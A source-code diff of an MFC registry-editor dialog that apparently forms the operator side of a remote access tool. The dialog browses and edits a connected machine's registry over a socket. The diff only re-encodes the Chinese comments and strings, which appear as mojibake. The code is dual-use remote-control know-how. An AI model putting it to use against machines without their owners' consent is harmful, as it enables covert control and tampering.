@@ -1,4 +1,4 @@
-// RegDlg.cpp : implementation file
+ï»¿// RegDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -75,22 +75,22 @@ BOOL CRegDlg::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - ×¢²á±í¹ÜÀí", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - æ³¨å†Œè¡¨ç®¡ç†", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
 	
 	size[0]=120;size[1]=80;size[2]=310;
-	m_list.InsertColumn(0,"Ãû³Æ",LVCFMT_LEFT,size[0],-1);
-	m_list.InsertColumn(1,"ÀàĞÍ",LVCFMT_LEFT,size[1],-1);
-	m_list.InsertColumn(2,"Êı¾İ",LVCFMT_LEFT,size[2],-1);
+	m_list.InsertColumn(0,"åç§°",LVCFMT_LEFT,size[0],-1);
+	m_list.InsertColumn(1,"ç±»å‹",LVCFMT_LEFT,size[1],-1);
+	m_list.InsertColumn(2,"æ•°æ®",LVCFMT_LEFT,size[2],-1);
     m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES);
-	//////Ìí¼ÓÍ¼±ê//////
+	//////æ·»åŠ å›¾æ ‡//////
 	m_HeadIcon.Create(16,16,TRUE,2,2);
 	m_HeadIcon.Add(AfxGetApp()->LoadIcon(IDI_STR_ICON));
 	m_HeadIcon.Add(AfxGetApp()->LoadIcon(IDI_DWORD_ICON));
 	
 	m_list.SetImageList(&m_HeadIcon,LVSIL_SMALL);
 	
-	//Ê÷¿Ø¼şÉèÖÃ
+	//æ ‘æ§ä»¶è®¾ç½®
 	HICON hIcon = NULL;
 	m_ImageList_tree.Create(18, 18, ILC_COLOR16,10, 0);
 	
@@ -126,7 +126,7 @@ BOOL CRegDlg::OnInitDialog()
 	              // EXCEPTION: OCX Property Pages should return FALSE
 }
 
-// ´´½¨×´Ì¬Ìõ
+// åˆ›å»ºçŠ¶æ€æ¡
 static UINT indicators[] =
 {
 	ID_SEPARATOR
@@ -143,7 +143,7 @@ void CRegDlg::CreatStatusBar()
 	}
 	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, 120);
 	
-	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //ÏÔÊ¾×´Ì¬À¸		
+	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //æ˜¾ç¤ºçŠ¶æ€æ 		
 	CRect rc;
 	::GetWindowRect(this->m_hWnd,rc);
 	//rc.top=rc.bottom-30;
@@ -200,11 +200,11 @@ void CRegDlg::OnReceiveComplete()
 	//BYTE b=m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0];
 	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
 	{
-	case TOKEN_REG_PATH:            //½ÓÊÕÏî
+	case TOKEN_REG_PATH:            //æ¥æ”¶é¡¹
 		addPath((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
 		EnableCursor(true);
 		break;
-	case TOKEN_REG_KEY:             //½ÓÊÕ¼ü, Öµ
+	case TOKEN_REG_KEY:             //æ¥æ”¶é”®, å€¼
 		addKey((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
 		EnableCursor(true);
 		break;
@@ -229,13 +229,13 @@ void CRegDlg::addPath(char *tmp)
 	DWORD size =msg.size;
 	int count=msg.count;
 	
-	if(size>0 && count>0) //Ò»µã±£»¤´ëÊ©
+	if(size>0 && count>0) //ä¸€ç‚¹ä¿æŠ¤æªæ–½
 	{
 		for(int i=0; i<count; i++)
 		{
 			char* szKeyName=tmp+size*i+msgsize;
-			m_tree.InsertItem(szKeyName,1,1,SelectNode,0); //²åÈë×Ó¼üÃû³Æ
-			//m_tree.Expand(SelectNode,TVE_EXPAND); //È¥µô²»Õ¹¿ªÊ÷
+			m_tree.InsertItem(szKeyName,1,1,SelectNode,0); //æ’å…¥å­é”®åç§°
+			//m_tree.Expand(SelectNode,TVE_EXPAND); //å»æ‰ä¸å±•å¼€æ ‘
 		}
 	}
 }
@@ -243,9 +243,9 @@ void CRegDlg::addPath(char *tmp)
 void CRegDlg::addKey(char *buf)
 {
 	m_list.DeleteAllItems();
-	int nitem=m_list.InsertItem(0,"(Ä¬ÈÏ)",0);
+	int nitem=m_list.InsertItem(0,"(é»˜è®¤)",0);
 	m_list.SetItemText(nitem,1,"REG_SZ");
-	m_list.SetItemText(nitem,2,"(ÊıÖµÎ´ÉèÖÃ)");
+	m_list.SetItemText(nitem,2,"(æ•°å€¼æœªè®¾ç½®)");
 	m_list.SetItemData(nitem,FALSE);
 	if(buf==NULL) return;
 	
@@ -254,11 +254,11 @@ void CRegDlg::addKey(char *buf)
 	char* temp = buf + sizeof(msg);
 	for(int i=0; i<msg.count; i++)
 	{
-		BYTE Type = temp[0];   //È¡³ö±êÖ¾Í·
+		BYTE Type = temp[0];   //å–å‡ºæ ‡å¿—å¤´
 		temp += sizeof(BYTE);
-		char* szValueName = temp;   //È¡³öÃû×Ö
+		char* szValueName = temp;   //å–å‡ºåå­—
 		temp += msg.size;
-		BYTE* szValueDate = (BYTE*)temp;      //È¡³öÖµ
+		BYTE* szValueDate = (BYTE*)temp;      //å–å‡ºå€¼
 		temp += msg.valsize;
 		
 		if(Type == MREG_SZ)
@@ -395,7 +395,7 @@ void CRegDlg::addKey(char *buf)
 char CRegDlg::getFatherPath(CString &FullPath)
 {
 	char bToken;
-	if(!FullPath.Find("HKEY_CLASSES_ROOT"))	//ÅĞ¶ÏÖ÷¼ü
+	if(!FullPath.Find("HKEY_CLASSES_ROOT"))	//åˆ¤æ–­ä¸»é”®
 	{
 		//MKEY=HKEY_CLASSES_ROOT;
 		bToken=MHKEY_CLASSES_ROOT;
@@ -440,29 +440,29 @@ void CRegDlg::OnSelchangedTree(NMHDR* pNMHDR, LRESULT* pResult)
 		m_list.DeleteAllItems();
 		return;
 	}
-    SelectNode=item.hItem;			//±£´æÓÃ»§´ò¿ªµÄ×ÓÊ÷½Úµã¾ä±ú
+    SelectNode=item.hItem;			//ä¿å­˜ç”¨æˆ·æ‰“å¼€çš„å­æ ‘èŠ‚ç‚¹å¥æŸ„
     m_list.DeleteAllItems();
 	
 	CString FullPath=GetFullPath(SelectNode);
     m_wndStatusBar.SetPaneText(0,FullPath);
-	HTREEITEM CurrentNode =  item.hItem; //È¡µÃ´Ë½ÚµãµÄÈ«Â·¾¶
+	HTREEITEM CurrentNode =  item.hItem; //å–å¾—æ­¤èŠ‚ç‚¹çš„å…¨è·¯å¾„
 	
 	while(m_tree.GetChildItem(CurrentNode)!=NULL)
 	{
-		m_tree.DeleteItem(m_tree.GetChildItem(CurrentNode));        //É¾³ı »á²úÉú OnSelchangingTreeÊÂ¼ş ***
+		m_tree.DeleteItem(m_tree.GetChildItem(CurrentNode));        //åˆ é™¤ ä¼šäº§ç”Ÿ OnSelchangingTreeäº‹ä»¶ ***
 	}
 	
 	char bToken=getFatherPath(FullPath);
-	//Óú¼ÓÒ»¸ö¼ü
-	int nitem=m_list.InsertItem(0,"(Ä¬ÈÏ)",0);
+	//æ„ˆåŠ ä¸€ä¸ªé”®
+	int nitem=m_list.InsertItem(0,"(é»˜è®¤)",0);
 	m_list.SetItemText(nitem,1,"REG_SZ");	
-	m_list.SetItemText(nitem,2,"(ÊıÖµÎ´ÉèÖÃ)");
+	m_list.SetItemText(nitem,2,"(æ•°å€¼æœªè®¾ç½®)");
 	m_list.SetItemData(nitem,FALSE);
 	//BeginWaitCursor(); 
 	//char *buf=new char[FullPath.GetLength]
-	FullPath.Insert(0,bToken);      //²åÈëÄÇ¸ö¸ù¼ü
+	FullPath.Insert(0,bToken);      //æ’å…¥é‚£ä¸ªæ ¹é”®
 	bToken=COMMAND_REG_FIND;
-    FullPath.Insert(0,bToken);      //²åÈë²éÑ¯ÃüÁî
+    FullPath.Insert(0,bToken);      //æ’å…¥æŸ¥è¯¢å‘½ä»¤
 	
     EnableCursor(false);
 	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength()+1);
@@ -471,19 +471,19 @@ void CRegDlg::OnSelchangedTree(NMHDR* pNMHDR, LRESULT* pResult)
 
 void CRegDlg::TestOK()
 {
-	//Ö´ĞĞÁËÊ²Ã´²Ù×÷    1£¬É¾³ıÏî  2£¬ĞÂ½¨Ïî   3£¬É¾³ı¼ü  4£¬ ĞÂ½¨¼ü  5£¬±à¼­¼ü  
+	//æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œ    1ï¼Œåˆ é™¤é¡¹  2ï¼Œæ–°å»ºé¡¹   3ï¼Œåˆ é™¤é”®  4ï¼Œ æ–°å»ºé”®  5ï¼Œç¼–è¾‘é”®  
 	if(how==1)
 	{
 		while(m_tree.GetChildItem(SelectNode)!=NULL)
 		{
-			m_tree.DeleteItem(m_tree.GetChildItem(SelectNode));        //É¾³ı »á²úÉú OnSelchangingTreeÊÂ¼ş ***
+			m_tree.DeleteItem(m_tree.GetChildItem(SelectNode));        //åˆ é™¤ ä¼šäº§ç”Ÿ OnSelchangingTreeäº‹ä»¶ ***
 		}
 		m_tree.DeleteItem(SelectNode);
         how=0;
 	}
 	else if(how==2)
 	{
-		m_tree.InsertItem(Path,1,1,SelectNode,0);//²åÈë×Ó¼üÃû³Æ
+		m_tree.InsertItem(Path,1,1,SelectNode,0);//æ’å…¥å­é”®åç§°
 		m_tree.Expand(SelectNode,TVE_EXPAND);
 		Path="";
 	}
@@ -494,7 +494,7 @@ void CRegDlg::TestOK()
 		else
 		{
 			m_list.SetItemText(index,1,"REG_SZ");
-			m_list.SetItemText(index,2,"(ÊıÖµÎ´ÉèÖÃ)");
+			m_list.SetItemText(index,2,"(æ•°å€¼æœªè®¾ç½®)");
 			m_list.SetItemData(index,FALSE);
 		}
 		index=0;
@@ -506,13 +506,13 @@ void CRegDlg::TestOK()
 		DWORD dwValueTemp = 0;
 		switch(type)
 		{
-		case MREG_SZ:     //¼ÓÁË×Ö´®
+		case MREG_SZ:     //åŠ äº†å­—ä¸²
 			nitem=m_list.InsertItem(m_list.GetItemCount(),Key,0);
 			m_list.SetItemText(nitem,1,"REG_SZ");	
 			m_list.SetItemText(nitem,2,Value);
 			m_list.SetItemData(nitem,TRUE);
 			break;
-		case MREG_DWORD:  //¼ÓÁËDWORD
+		case MREG_DWORD:  //åŠ äº†DWORD
 			dwValueTemp=atoi(Value.GetBuffer(0));
 			sprintf(dwValueDate,"0x%08x(%u)",dwValueTemp,dwValueTemp);
 			nitem=m_list.InsertItem(m_list.GetItemCount(),Key,1);
@@ -537,11 +537,11 @@ void CRegDlg::TestOK()
 		DWORD dwValueTemp = 0;
 		switch(type)
 		{
-		case MREG_SZ:     //¸ÄÁË×Ö´®
+		case MREG_SZ:     //æ”¹äº†å­—ä¸²
 			m_list.SetItemText(index,2,Value);
 			m_list.SetItemData(index,TRUE);
 			break;
-		case MREG_DWORD:  //¸ÄÁËDWORD
+		case MREG_DWORD:  //æ”¹äº†DWORD
 			dwValueTemp=atod(Value.GetBuffer(0));
 			sprintf(dwValueDate,"0x%08x(%u)",dwValueTemp,dwValueTemp);
 			m_list.SetItemText(index,2,dwValueDate);
@@ -577,11 +577,11 @@ CString CRegDlg::GetFullPath(HTREEITEM hCurrent)
 	while(1)
 	{
 		if(hCurrent==m_hRoot) return strReturn;
-        strTemp = m_tree.GetItemText(hCurrent);   //µÃµ½µ±Ç°µÄ
+        strTemp = m_tree.GetItemText(hCurrent);   //å¾—åˆ°å½“å‰çš„
 		if(strTemp.Right(1) != "\\")
 			strTemp += "\\";
 		strReturn = strTemp  + strReturn;
-		hCurrent = m_tree.GetParentItem(hCurrent);   //µÃµ½¸¸µÄ
+		hCurrent = m_tree.GetParentItem(hCurrent);   //å¾—åˆ°çˆ¶çš„
 		
 	}
 	return strReturn;
@@ -593,8 +593,8 @@ DWORD CRegDlg::atod(char *ch)
 	DWORD d=0;
 	for(int i=0;i<len;i++)
 	{
-		int t=ch[i]-48;   //ÕâÎ»ÉÏµÄÊı×Ö
-		if(ch[i]>57||ch[i]<48) //²»ÊÇÊı×Ö
+		int t=ch[i]-48;   //è¿™ä½ä¸Šçš„æ•°å­—
+		if(ch[i]>57||ch[i]<48) //ä¸æ˜¯æ•°å­—
 		{
 			return d;
 		}
@@ -612,7 +612,7 @@ void CRegDlg::OnClose()
 	DestroyWindow();
 }
 
-/* µÃµ½ÁĞ±íµÄÀàĞÍ
+/* å¾—åˆ°åˆ—è¡¨çš„ç±»å‹
 MREG_SZ,
 MREG_DWORD,
 MREG_BINARY,
@@ -620,7 +620,7 @@ MREG_EXPAND_SZ*/
 BYTE CRegDlg::getType(int index)
 {
 	if(index<0) return 100;
-    CString strType=m_list.GetItemText(index,1);      //µÃµ½ÀàĞÍ
+    CString strType=m_list.GetItemText(index,1);      //å¾—åˆ°ç±»å‹
     if(strType=="REG_SZ") 
 		return  MREG_SZ;
 	else if(strType=="REG_DWORD")
@@ -656,7 +656,7 @@ void CRegDlg::OnRclickTree(NMHDR* pNMHDR, LRESULT* pResult)
 		CPoint	p;
 		GetCursorPos(&p);
 		
-//		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//¼ÓÉÏÕâ¾äÃ»ÓĞÓÒ¼üÍ¼±ê
+//		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//åŠ ä¸Šè¿™å¥æ²¡æœ‰å³é”®å›¾æ ‡
 		CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
 
     }
@@ -666,13 +666,13 @@ void CRegDlg::OnRclickTree(NMHDR* pNMHDR, LRESULT* pResult)
 void CRegDlg::OnRegtDel() 
 {
 	// TODO: Add your command handler code here
-	CString FullPath=GetFullPath(SelectNode);      //µÃµ½È«Â·¾¶
+	CString FullPath=GetFullPath(SelectNode);      //å¾—åˆ°å…¨è·¯å¾„
 	char bToken=getFatherPath(FullPath);
 	//        COMMAND_REG_DELPATH
 	
-    FullPath.Insert(0,bToken);//²åÈë  ÄÇ¸ö¸ù¼ü
+    FullPath.Insert(0,bToken);//æ’å…¥  é‚£ä¸ªæ ¹é”®
 	bToken=COMMAND_REG_DELPATH;
-    FullPath.Insert(0,bToken);      //²åÈë²éÑ¯ÃüÁî
+    FullPath.Insert(0,bToken);      //æ’å…¥æŸ¥è¯¢å‘½ä»¤
     how=1;
 	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength()+1);
 
@@ -688,15 +688,15 @@ void CRegDlg::OnRegtCreat()
 	if(dlg.isOK)
 	{
 		//MessageBox(dlg.m_path);   COMMAND_REG_CREATEPATH
-		CString FullPath=GetFullPath(SelectNode);      //µÃµ½È«Â·¾¶
+		CString FullPath=GetFullPath(SelectNode);      //å¾—åˆ°å…¨è·¯å¾„
 		//FullPath+="\\";
 		FullPath+=dlg.m_path;
 		char bToken=getFatherPath(FullPath);
 		//        COMMAND_REG_DELPATH
 		
-		FullPath.Insert(0,bToken);//²åÈë  ÄÇ¸ö¸ù¼ü
+		FullPath.Insert(0,bToken);//æ’å…¥  é‚£ä¸ªæ ¹é”®
 		bToken=COMMAND_REG_CREATEPATH;
-		FullPath.Insert(0,bToken);      //²åÈë²éÑ¯ÃüÁî
+		FullPath.Insert(0,bToken);      //æ’å…¥æŸ¥è¯¢å‘½ä»¤
 		how=2;
 		Path=dlg.m_path;
 		m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength()+1);
@@ -718,18 +718,18 @@ void CRegDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
 	CPoint	p;
 	GetCursorPos(&p);
 	
-	if (m_list.GetSelectedCount() == 0)             //Ã»ÓĞÑ¡ÖĞ
+	if (m_list.GetSelectedCount() == 0)             //æ²¡æœ‰é€‰ä¸­
 	{
-		pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //±à¼­
-		pM->EnableMenuItem(1, MF_BYPOSITION | MF_GRAYED);     //É¾³ı
+		pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //ç¼–è¾‘
+		pM->EnableMenuItem(1, MF_BYPOSITION | MF_GRAYED);     //åˆ é™¤
 	}else{
 		if(getType(m_list.GetSelectionMark())==100)
-			pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //±à¼­
-		pM->EnableMenuItem(2, MF_BYPOSITION | MF_GRAYED);         //ĞÂ½¨
+			pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //ç¼–è¾‘
+		pM->EnableMenuItem(2, MF_BYPOSITION | MF_GRAYED);         //æ–°å»º
 		
 	}
 
-//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//¼ÓÉÏÕâ¾äÃ»ÓĞÓÒ¼üÍ¼±ê
+//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//åŠ ä¸Šè¿™å¥æ²¡æœ‰å³é”®å›¾æ ‡
 	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);
 	*pResult = 0;
 }
@@ -744,25 +744,25 @@ void CRegDlg::OnReglEdit()
 	switch(b)
 	{
 	case MREG_SZ:
-		isEdit=true;             //±äÎª¿É±à¼­×´Ì¬
-		Key=m_list.GetItemText(index,0);       //µÃµ½Ãû
+		isEdit=true;             //å˜ä¸ºå¯ç¼–è¾‘çŠ¶æ€
+		Key=m_list.GetItemText(index,0);       //å¾—åˆ°å
 		if (!m_list.GetItemData(index))
 			Value="";
 		else
-			Value=m_list.GetItemText(index,2); //µÃµ½Öµ
+			Value=m_list.GetItemText(index,2); //å¾—åˆ°å€¼
 		OnReglStr();
 		how=5;
 		this->index=index;
 		break;
 	case MREG_DWORD:
-		isEdit=true;             //±äÎª¿É±à¼­×´Ì¬
-		Key=m_list.GetItemText(index,0);       //µÃµ½Ãû
+		isEdit=true;             //å˜ä¸ºå¯ç¼–è¾‘çŠ¶æ€
+		Key=m_list.GetItemText(index,0);       //å¾—åˆ°å
 		if (!m_list.GetItemData(index))
 			Value="";
 		else
 		{
-			Value.Format("%s",m_list.GetItemText(index,2)); //µÃµ½Öµ
-			Value.Delete(0,Value.Find('(')+1); // È¥µôÀ¨ºÅ
+			Value.Format("%s",m_list.GetItemText(index,2)); //å¾—åˆ°å€¼
+			Value.Delete(0,Value.Find('(')+1); // å»æ‰æ‹¬å·
 			Value.Delete(Value.GetLength()-1);
 		}
 		OnReglDword();
@@ -770,12 +770,12 @@ void CRegDlg::OnReglEdit()
 		this->index=index;
 		break;
 	case MREG_EXPAND_SZ:
-		isEdit=true;             //±äÎª¿É±à¼­×´Ì¬
-		Key=m_list.GetItemText(index,0);       //µÃµ½Ãû
+		isEdit=true;             //å˜ä¸ºå¯ç¼–è¾‘çŠ¶æ€
+		Key=m_list.GetItemText(index,0);       //å¾—åˆ°å
 		if (!m_list.GetItemData(index))
 			Value="";
 		else
-			Value=m_list.GetItemText(index,2); //µÃµ½Öµ
+			Value=m_list.GetItemText(index,2); //å¾—åˆ°å€¼
 		OnReglExstr();
 		how=5;
 		this->index=index;
@@ -785,7 +785,7 @@ void CRegDlg::OnReglEdit()
 	}
 }
 
-//É¾³ı¼ü   COMMAND_REG_DELKEY
+//åˆ é™¤é”®   COMMAND_REG_DELKEY
 void CRegDlg::OnReglDelkey() 
 {
 	// TODO: Add your command handler code here
@@ -793,27 +793,27 @@ void CRegDlg::OnReglDelkey()
 	
 	int index=m_list.GetSelectionMark();
 	
-	CString FullPath=GetFullPath(SelectNode);      //µÃµ½È«Â·¾¶
+	CString FullPath=GetFullPath(SelectNode);      //å¾—åˆ°å…¨è·¯å¾„
 	char bToken=getFatherPath(FullPath);
 	
-	CString key=m_list.GetItemText(index,0);      //µÃµ½¼üÃû
+	CString key=m_list.GetItemText(index,0);      //å¾—åˆ°é”®å
     
-	msg.size=FullPath.GetLength();              //  ÏîÃû´óĞ¡
-	msg.valsize=key.GetLength();               //¼üÃû´óĞ¡
+	msg.size=FullPath.GetLength();              //  é¡¹åå¤§å°
+	msg.valsize=key.GetLength();               //é”®åå¤§å°
     
 	int datasize=sizeof(msg)+msg.size+msg.valsize+4;
 	char *buf=new char[datasize];
 	ZeroMemory(buf,datasize);
 	
-    buf[0]=COMMAND_REG_DELKEY;     //ÃüÁîÍ·
-	buf[1]=bToken;              //Ö÷¼ü
-	memcpy(buf+2,(void*)&msg,sizeof(msg));                     //Êı¾İÍ·
-	if(msg.size>0)        //¸ù¼ü ¾Í²»ÓÃĞ´ÏîÁË
-		memcpy(buf+2+sizeof(msg),FullPath.GetBuffer(0),FullPath.GetLength());  //ÏîÖµ
+    buf[0]=COMMAND_REG_DELKEY;     //å‘½ä»¤å¤´
+	buf[1]=bToken;              //ä¸»é”®
+	memcpy(buf+2,(void*)&msg,sizeof(msg));                     //æ•°æ®å¤´
+	if(msg.size>0)        //æ ¹é”® å°±ä¸ç”¨å†™é¡¹äº†
+		memcpy(buf+2+sizeof(msg),FullPath.GetBuffer(0),FullPath.GetLength());  //é¡¹å€¼
 	if(index==0)
-		memcpy(buf+2+sizeof(msg)+FullPath.GetLength(),"",1);  //É¾³ıÄ¬ÈÏ¼üÖµ
+		memcpy(buf+2+sizeof(msg)+FullPath.GetLength(),"",1);  //åˆ é™¤é»˜è®¤é”®å€¼
 	else
-		memcpy(buf+2+sizeof(msg)+FullPath.GetLength(),key.GetBuffer(0),key.GetLength());  //¼üÖµ
+		memcpy(buf+2+sizeof(msg)+FullPath.GetLength(),key.GetBuffer(0),key.GetLength());  //é”®å€¼
 	how=3;
 	this->index=index;
     m_iocpServer->Send(m_pContext, (LPBYTE)(buf), datasize);
@@ -825,7 +825,7 @@ void CRegDlg::OnReglStr()
 {
 	// TODO: Add your command handler code here
 	CRegDataDlg dlg(this);
-	if(isEdit) //ÊÇ±à¼­
+	if(isEdit) //æ˜¯ç¼–è¾‘
 	{
 		dlg.m_path=Key;
 		dlg.m_key=Value;
@@ -835,7 +835,7 @@ void CRegDlg::OnReglStr()
 	dlg.DoModal();
 	if(dlg.isOK)
 	{
-		CString FullPath=GetFullPath(SelectNode);      //µÃµ½È«Â·¾¶
+		CString FullPath=GetFullPath(SelectNode);      //å¾—åˆ°å…¨è·¯å¾„
 		char bToken=getFatherPath(FullPath);
 		DWORD size=1+1+1+sizeof(REGMSG)+FullPath.GetLength()+dlg.m_path.GetLength()+dlg.m_key.GetLength()+6;
 		char* buf=new char[size];
@@ -843,27 +843,27 @@ void CRegDlg::OnReglStr()
 		ZeroMemory(buf,size);
         
 		REGMSG msg;
-		msg.count=FullPath.GetLength();            //Ïî´óĞ¡
-		msg.size=dlg.m_path.GetLength();          //¼ü´óĞ¡
-		msg.valsize=dlg.m_key.GetLength();        //Êı¾İ´óĞ¡
+		msg.count=FullPath.GetLength();            //é¡¹å¤§å°
+		msg.size=dlg.m_path.GetLength();          //é”®å¤§å°
+		msg.valsize=dlg.m_key.GetLength();        //æ•°æ®å¤§å°
 		
-		buf[0]=COMMAND_REG_CREATKEY;               //Êı¾İÍ·
-		buf[1]=MREG_SZ;                           //ÖµÀàĞÍ
-		buf[2]=bToken;                           //¸¸¼ü
-		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //Êı¾İÍ·
+		buf[0]=COMMAND_REG_CREATKEY;               //æ•°æ®å¤´
+		buf[1]=MREG_SZ;                           //å€¼ç±»å‹
+		buf[2]=bToken;                           //çˆ¶é”®
+		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //æ•°æ®å¤´
 		char* tmp=buf+3+sizeof(msg);
 		if(msg.count>0)
-			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //Ïî  
+			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //é¡¹  
 		tmp+=msg.count;
 		if(m_list.GetSelectionMark()==0)
-			memcpy(tmp,"",1);                //ĞŞ¸ÄÄ¬ÈÏ¼üÃû
+			memcpy(tmp,"",1);                //ä¿®æ”¹é»˜è®¤é”®å
 		else
-			memcpy(tmp,dlg.m_path.GetBuffer(0),msg.size);          //¼üÃû
+			memcpy(tmp,dlg.m_path.GetBuffer(0),msg.size);          //é”®å
 		tmp+=msg.size;
-		memcpy(tmp,dlg.m_key.GetBuffer(0),msg.valsize);          //Öµ
+		memcpy(tmp,dlg.m_key.GetBuffer(0),msg.valsize);          //å€¼
 		tmp=buf+3+sizeof(msg);
 		
-		// ÉÆºó
+		// å–„å
 		type=MREG_SZ;
 		how=4;
 		Key=dlg.m_path;
@@ -881,7 +881,7 @@ void CRegDlg::OnReglDword()
 	// TODO: Add your command handler code here
 	CRegDataDlg dlg(this);
 	dlg.isDWORD=true;
-	if(isEdit) //ÊÇ±à¼­
+	if(isEdit) //æ˜¯ç¼–è¾‘
 	{
 		dlg.m_path=Key;
 		dlg.m_key=Value;
@@ -891,7 +891,7 @@ void CRegDlg::OnReglDword()
 	dlg.DoModal();
 	if(dlg.isOK)
 	{
-		CString FullPath=GetFullPath(SelectNode);      //µÃµ½È«Â·¾¶
+		CString FullPath=GetFullPath(SelectNode);      //å¾—åˆ°å…¨è·¯å¾„
 		char bToken=getFatherPath(FullPath);
 		DWORD size=1+1+1+sizeof(REGMSG)+FullPath.GetLength()+dlg.m_path.GetLength()+dlg.m_key.GetLength()+6;
 		char* buf=new char[size];
@@ -899,24 +899,24 @@ void CRegDlg::OnReglDword()
 		ZeroMemory(buf,size);
         
 		REGMSG msg;
-		msg.count=FullPath.GetLength();            //Ïî´óĞ¡
-		msg.size=dlg.m_path.GetLength();          //¼ü´óĞ¡
-		msg.valsize=dlg.m_key.GetLength();        //Êı¾İ´óĞ¡
+		msg.count=FullPath.GetLength();            //é¡¹å¤§å°
+		msg.size=dlg.m_path.GetLength();          //é”®å¤§å°
+		msg.valsize=dlg.m_key.GetLength();        //æ•°æ®å¤§å°
 		
-		buf[0]=COMMAND_REG_CREATKEY;               //Êı¾İÍ·
-		buf[1]=MREG_DWORD;                           //ÖµÀàĞÍ
-		buf[2]=bToken;                           //¸¸¼ü
-		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //Êı¾İÍ·
+		buf[0]=COMMAND_REG_CREATKEY;               //æ•°æ®å¤´
+		buf[1]=MREG_DWORD;                           //å€¼ç±»å‹
+		buf[2]=bToken;                           //çˆ¶é”®
+		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //æ•°æ®å¤´
 		char* tmp=buf+3+sizeof(msg);
 		if(msg.count>0)
-			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //Ïî  
+			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //é¡¹  
 		tmp+=msg.count;
-		memcpy(tmp,dlg.m_path.GetBuffer(0),msg.size);          //¼üÃû
+		memcpy(tmp,dlg.m_path.GetBuffer(0),msg.size);          //é”®å
 		tmp+=msg.size;
-		memcpy(tmp,dlg.m_key.GetBuffer(0),msg.valsize);          //Öµ
+		memcpy(tmp,dlg.m_key.GetBuffer(0),msg.valsize);          //å€¼
 		tmp=buf+3+sizeof(msg);
 		
-		// ÉÆºó
+		// å–„å
 		type=MREG_DWORD;
 		how=4;
 		Key=dlg.m_path;
@@ -933,7 +933,7 @@ void CRegDlg::OnReglExstr()
 {
 	// TODO: Add your command handler code here
 	CRegDataDlg dlg(this);
-    if(isEdit) //ÊÇ±à¼­
+    if(isEdit) //æ˜¯ç¼–è¾‘
 	{
 		dlg.m_path=Key;
 		dlg.m_key=Value;
@@ -943,7 +943,7 @@ void CRegDlg::OnReglExstr()
 	dlg.DoModal();
 	if(dlg.isOK)
 	{
-		CString FullPath=GetFullPath(SelectNode);      //µÃµ½È«Â·¾¶
+		CString FullPath=GetFullPath(SelectNode);      //å¾—åˆ°å…¨è·¯å¾„
 		char bToken=getFatherPath(FullPath);
 		DWORD size=1+1+1+sizeof(REGMSG)+FullPath.GetLength()+dlg.m_path.GetLength()+dlg.m_key.GetLength()+6;
 		char* buf=new char[size];
@@ -951,24 +951,24 @@ void CRegDlg::OnReglExstr()
 		ZeroMemory(buf,size);
         
 		REGMSG msg;
-		msg.count=FullPath.GetLength();            //Ïî´óĞ¡
-		msg.size=dlg.m_path.GetLength();          //¼ü´óĞ¡
-		msg.valsize=dlg.m_key.GetLength();        //Êı¾İ´óĞ¡
+		msg.count=FullPath.GetLength();            //é¡¹å¤§å°
+		msg.size=dlg.m_path.GetLength();          //é”®å¤§å°
+		msg.valsize=dlg.m_key.GetLength();        //æ•°æ®å¤§å°
 		
-		buf[0]=COMMAND_REG_CREATKEY;               //Êı¾İÍ·
-		buf[1]=MREG_EXPAND_SZ;                           //ÖµÀàĞÍ
-		buf[2]=bToken;                           //¸¸¼ü
-		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //Êı¾İÍ·
+		buf[0]=COMMAND_REG_CREATKEY;               //æ•°æ®å¤´
+		buf[1]=MREG_EXPAND_SZ;                           //å€¼ç±»å‹
+		buf[2]=bToken;                           //çˆ¶é”®
+		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //æ•°æ®å¤´
 		char* tmp=buf+3+sizeof(msg);
 		if(msg.count>0)
-			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //Ïî  
